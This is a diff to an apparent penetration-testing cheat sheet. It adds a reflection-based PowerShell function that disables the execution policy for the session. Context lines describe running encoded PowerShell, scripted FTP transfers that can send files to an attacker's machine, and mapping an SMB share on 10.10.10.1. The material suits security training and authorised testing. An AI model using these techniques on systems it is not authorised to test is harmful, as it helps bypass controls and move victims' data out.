@@ -105,6 +105,20 @@ $encodedCommand = [Convert]::ToBase64String($bytes)
 powershell.exe -EncodedCommand $encodedCommand
 ```
 
+**Disable ExecutionPolicy by Swapping out the AuthorizationManager**
+
+The function below can be executed via an interactive PowerShell console or by using the `command` switch. Once the function is called it will swap out the `AuthorizationManager` with `null`. As a result, the execution policy is essentially set to `Unrestricted` for the remainder of the session. This technique does not result in a persistent configuration change or require writing to disk. The change will be applied for the duration of the session, however.
+
+```powershell
+function Disable-ExecutionPolicy 
+{
+    ($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))
+}  
+
+#Finally run the function to effectively disable the Execution Policy
+Disable-ExecutionPolicy
+```
+
 ### Sudo for Windows
 
 There may be times when you know the credentials for another user, but can't spawn other windows. The `sudo` equivalent in PowerShell on Windows machines is the verb `RunAs`. It is not as simple to use as `sudo`, however.
@@ -415,7 +429,8 @@ anonymous
 <strong>&#x3C;anypasswordhere>
 </strong>binary
 get $file_to_download
-bye</code></pre>
+bye
+</code></pre>
 
 Then you can simply run `ftp -s:ftp_commands.txt` and download a file with no user interaction.  Use **`-i`** to disable interactive prompting during multiple file transfers. You can also use the `put $file_to_upload` command instead of `get` to send a file to the attacker's machine.
 
@@ -497,7 +512,8 @@ net use z: \\10.10.10.1\test /user:test test
 
 Or using the `New-PSDrive` PowerShell cmdlet
 
-<pre class="language-powershell"><code class="lang-powershell"><strong>New-PSDrive -Name "z" -PSProvider "FileSystem" -Root "\\10.10.10.1\test"</strong></code></pre>
+<pre class="language-powershell"><code class="lang-powershell"><strong>New-PSDrive -Name "z" -PSProvider "FileSystem" -Root "\\10.10.10.1\test"
+</strong></code></pre>
 
 ### Download files with PowerShell
 
